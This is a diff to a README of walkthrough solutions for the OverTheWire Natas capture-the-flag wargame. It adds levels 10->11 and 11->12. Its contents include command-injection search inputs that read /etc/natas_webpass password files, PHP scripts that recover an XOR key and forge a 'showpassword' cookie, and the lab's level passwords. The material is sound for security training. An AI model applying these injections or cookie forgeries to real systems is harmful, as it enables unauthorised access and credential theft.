@@ -14,6 +14,8 @@ Don't be sly! Try to solve the challenges on your own before comparing with my s
 9. [natas 7 -> 8](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-7---8)
 10. [natas 8 -> 9](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-8---9)
 11. [natas 9 -> 10](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-9---10)
+12. [natas 10 -> 11](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-10---11)
+13. [natas 11 -> 12](https://github.com/AlbertoSpinella/over-the-wire-natas-partial#natas-11---12)
 
 ## natas 0
 
@@ -116,7 +118,85 @@ decodeSecret($encodedSecret);
  - Try entering something in the field, then press Search. Then click on View sourcecode.
  - As you can't see, the input isn't sanitized. Try to search `a; ls -l`.
  - Now search `a; pwd` to print your current directory.
- - Now run `a; cat ../../../../etc/natas_webpass/natas9`.
+ - Now search `a; ls -la ../../../../etc/natas_webpass`.
+ - In the end, search `a; cat ../../../../etc/natas_webpass/natas10`.
  - Visit the link: http://natas10.natas.labs.overthewire.org
 	- username: natas10
-	- password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+	- password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+# natas 10 -> 11
+ - Take a look at the source code. It deny strings with certain characters.
+ - In the Search field, enter two random letters, like `q z`, with a space between. This is necessary to understand that it searches both.
+ - Try to search the following:
+ 	- `a /etc/natas_webpass/natas11`
+ - Probably, the password doesn't contain an `a` character. Try searching the following:
+ 	- `b /etc/natas_webpass/natas11`
+ - As last, search:
+ 	- `c /etc/natas_webpass/natas11`
+ - Visit the link: http://natas11.natas.labs.overthewire.org
+	- username: natas11
+	- password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+# natas 11 -> 12
+ - Press F12.
+ - Go to Archiviation and find the cookie "data".
+ - Take a look at the source code.
+ - Execute this PHP script where `$b64_decode` is the content of the cookie:
+```
+<?php
+
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in, $key) {
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function printData($defaultdata) {
+    $b64_decode = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSMX4MNzF%2BaAw");
+    $default = json_encode($defaultdata);
+    print(xor_encrypt($b64_decode, $default));
+}
+
+printData($defaultdata);
+?>
+```
+ - The key is **qw8J**.
+ - Execute this second PHP script that uses this key:
+```
+<?php
+
+$showpassword = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in, $key) {
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function printData($defaultdata) {
+    $default = json_encode($defaultdata);
+    
+    print(base64_encode(xor_encrypt($default, "qw8J")));
+}
+
+printData($showpassword);
+?>
+```
+ - The result is a base64 encoded cookie. Replace it in the browser, then click on "Set color" button.
+ - Visit the link: http://natas12.natas.labs.overthewire.org
+	- username: natas12
+	- password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
